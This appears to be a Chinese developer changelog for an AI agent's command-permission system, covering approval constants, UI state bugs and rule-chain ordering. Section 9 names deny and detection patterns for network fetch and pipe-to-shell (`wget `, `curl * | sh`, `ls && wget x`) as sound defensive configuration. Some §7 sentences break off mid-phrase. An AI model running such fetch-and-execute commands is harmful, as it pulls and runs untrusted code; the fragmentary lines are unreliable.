测试首跑揪出两处**两族常量**（`APPROVE_*`：gate↔broker 接口词族 `allow_once/allow_session/deny`；`OUTCOME_*`：事件与落盘词族 `allowed_once/allowed_session/denied/timeout/stopped`）的混用，修复后收敛为：

1. **approval.py 撞车路径**（同会话第二个并发审批立即拒绝）返回值须是 `APPROVE_DENY`（`"deny"`），不是裸结局词 `"denied"` —— broker 的返回值是给 gate 的接口契约。
2. **落盘词族**：tool 行 `approval.decision` 用 §7 的结局词（`"denied"`），broker 返回的 `APPROVE_DENY` 在 `PermissionGate.note_approval_record` 处翻译 —— **两个常量族的唯一交汇点收敛在这一行**。

### 3. 回放链路补通（前端联调发现的后端断点）

前端联调发现回放徽标数据断链，补通三处（范式 C 的另一半保证）：

- `load_session_history` 的 tool 行投影**读取保留** `approval`（与 assistant 行 `usage`/`model_info` 同模式）；
- 模型上下文由 Agent 发送边界 `MODEL_MSG_FIELDS`（`role/content/reasoning_content/tool_calls/tool_call_id`）白名单投影剔除 —— `approval` 不在白名单。「**读取不设限、发送白名单**」双保险，审批决定永不进模型上下文；

### 6. 上线即崩修复：zustand v5 selector 快照稳定性（2026-09-22 联调日）

**现象**：切换历史会话必现「界面出错了」（ErrorBoundary 兜底 `Maximum update depth exceeded`）；崩后重载回到新建任务空态，盾牌 chip 落到 `disabled={!hasSession}` 分支，表现为「下拉框点不动、只显示默认」。两个症状同根。

**根因**：`MessageList.tsx` 的 `orphanApprovals` 与 `MessageItem.tsx` 的 `mainApprovals/subApprovals` 两个 selector 在选择器体内 `Object.values(...).filter(...)` / 返回新对象字面量 —— **zustand v5（5.0.15）的 `useStore` 直接跑在 React `useSyncExternalStore` 上，selector 返回值就是 getSnapshot**，每次调用返回新引用 → React 判定快照永远在变 → 无限重渲染循环。挂载了消息列表的界面（切会话回放后）必崩；空态（无消息、MessageItem 不挂载）侥幸不触发，掩盖了问题。

**修复**（范式：**selector 只取 store 里的稳定引用，派生计算放 `useMemo`**）：

1. 两个组件的 selector 收敛为 `s.approvalBySession[s.activeSession]`（缺条目时 `undefined`，同样引用稳定）；
2. `orphanApprovals` 过滤、`mainApprovals/subApprovals` 配对改在 `useMemo` 中计算（依赖 `[approvalTable, messages]` / `[msg, approvalTable]`）。

**约束（后续新增 selector 必须遵守）**：`useAgentStore((s) => ...)` 的返回值必须是引用稳定值 —— 原始类型、store 中已存在的对象/数组，或组件外常量（如 `EMPTY_ARR`）。选择器体内**禁止** `filter/map/Object.values`、对象/数组字面量；需要派生数据时取稳定入参后用 `useMemo`（或 `zustand/react/shallow` 的 `useShallow`）。后端 `session_history` 的 `permission_mode` 恢复、chip 菜单、`permission_changed` 广播链路本身无缺陷，修复后全链路（切会话回显档位、菜单切换、跨窗口广播）实测通过。

### 7. 新建任务态档位可切换 + projects.json default 档位抹除修复（2026-09-22 联调日）

**需求**：新建任务（无会话）界面盾牌 chip 原设计只读（`disabled={!hasSession}`，「切换命令需要会话号」），用户无法在发首条消息前调档位。修正为**可点开菜单切换**。

- 后端 `ws_bridge` 新增 `project_permission` 命令：校验 `mode ∈ VALID_MODES` →
  `registry.set_permission_mode(pid, mode)`（写 projects.json「最后更改值」）→
  成功后 `reply_projects()` 广播。**不回** `permission_changed`（无会话号）。

  IPC → main 白名单校验转发 → `agentStore.switchProjectPermission`（目标空间 =
  `pendingProjectId ?? activeProject`，fire-and-forget）→ `InputBox` chip 去掉

  `switchProjectPermission`。chip 选中态空态下由 `projects` 广播驱动（不乐观更新）。

  的预告）；切换只影响**之后新建**的会话，已有会话各自折叠的档位不动。

**顺手修复的后端缺陷**（`project_registry.py _load()`）：default 工作空间的索引条目

#### 8.2 揪出的前端契约缺陷：`permission_config` 回执不能整份覆盖 store

**现象**：点「保存更改」后，整个权限页塌成一行「读取权限配置…」，七分区全没。

**根因**：`permission_config` 的两种回执各只带一半字段 —— `get` 带
`builtin`/`path`/`exists`，`save` 带 `applied`/`warnings`/`msg`（类型里
`builtin` 声明为可选，注释写的正是「get 回执有；save 回执可省」）。而 store 三处
都做 `set({ permissionConfig: res })` **整份替换** → 保存后 `builtin` 变
`undefined` → 组件 `if (!draft || !builtin) return <div className="perm-loading">`
兜底分支直接命中。

**修复**：`agentStore.ts` 新增 `mergePermissionResult(prev, next)`，三处（WS 分发 /
`loadPermissionConfig` / `savePermissionConfig`）统一改用它：`{...prev, ...next}` 合并；
且 `next.applied === undefined`（即 get 回执）时显式清空 `applied`/`warnings`/`msg`
—— 否则上一次保存的「被调整」告警会挂在新加载的干净配置上，变成假告警。

**约束（后续新增「点对点回执」类事件必须遵守）**：**回执是补丁、不是快照**。
只要同一 kind 存在两种形状（读回执 / 写回执），消费端一律 merge，禁止整份替换；
若要整份替换，后端就必须每次下发完整快照。二选一，不能混。

### 9. 二次改造：删自定义规则 + 判定次序上界面（2026-09-22，同日）

> 起因：用户看设置页后提问「自定义规则是不是和安全命令白名单、危险命令、硬拒绝里的
> 添加功能重复了？」。实测确认**重复**，且重复已经开始**漂移**（同一语义两套实现），
> 遂决定删掉 ⑦，并把判定次序直接摊到界面上。

#### 9.1 为什么删 ⑦（实测证据）

| 对照 | 结果 |
| --- | --- |
| ⑥ `deny_patterns` 加 `wget ` ｜ ⑦ `rules(deny, wget )` | **完全等价**，连 reason 文案都一样 → 纯冗余 |
| ④ `safe_commands.list` 加 `ls` ｜ ⑦ `rules(allow, ls)`，命令 `ls && wget x` | ④ → `approve`（逐段）；⑦ → `allow`（**整条放行**）→ 不是重复，是**粒度不同**且更危险 |
| ⑤ `dangerous_patterns` 加 `git push ` ｜ ⑦ `rules(ask, git push )` | 效果同（都送审批），但两处落点不同 → **规则更早**，并存时规则赢、危险设置静默失效 |
| 跨段模式 `curl * \| sh` 配在 ⑥ / ⑦(deny) | ⑥：**完全不参与判定**；⑦：命中但分支只判 `allow`、其余全走审批 → **deny 被降级为 ask** |

三个衍生缺陷一并处理：

- **B1** `rules[action=deny]` + 跨段模式被降级为 ask —— 随 ⑦ 下线消失。
- **B2** `deny_patterns` 里的跨段模式**完全不生效** → ② 补 `cross_pattern_matches`
  （与 ⑦-1 口径对齐）。**这个与 ⑦ 无关，是独立修复**。
- **B3** `rules[action=allow]` 是「任一段命中即整条放行」，与分段隔离原则相矛盾 ——
  随 ⑦ 下线消失（④ 的逐段语义成为唯一的 allow 表达）。

#### 9.2 次序修正（本轮唯一的判定链改动）

⑦ 的 bash 分支由「白名单 → 危险」改为「**危险 → 白名单**」，理由见 §3.2 的次序修正块
（安全洞与能力缺口同源）。用户可见效果：④ 写大类、⑤ 写特例即可表达
「大类放行 + 特例除外」。

#### 9.3 存量配置迁移（`_normalize`）

`rules` 按 action 迁入三个列表；输出 `rules` 恒为空数组（**幂等**，写盘后再读已无可迁移项）；
原始内容备份到 `<permissions.json>.rules-bak`（**仅首次写，不覆盖**，保留用户最初那份）。
`allow` 迁移会**收严**（整条放行 → 逐段放行），`_normalize_warnings()` 会就此给出人话说明。

#### 9.4 设置页新增「判定顺序」区块

数据来自后端 `builtin_snapshot()["order"]`（四档：硬拒绝 / 危险命令 / 安全白名单 /
未列出），与 `evaluate` 的实现次序同源 —— **前端零硬编码**。改判定链必须同步改
`builtin_snapshot`，否则界面会描述一个不存在的顺序。每档展示：序号、名称、处置、
位置说明（`rank`）、一句话解释（`note`）；左侧色条编码严格程度（红 / 琥珀 / 绿 / 灰）。
`④⑤⑥` 三区的说明文案也各自点明自己在链上的位置。
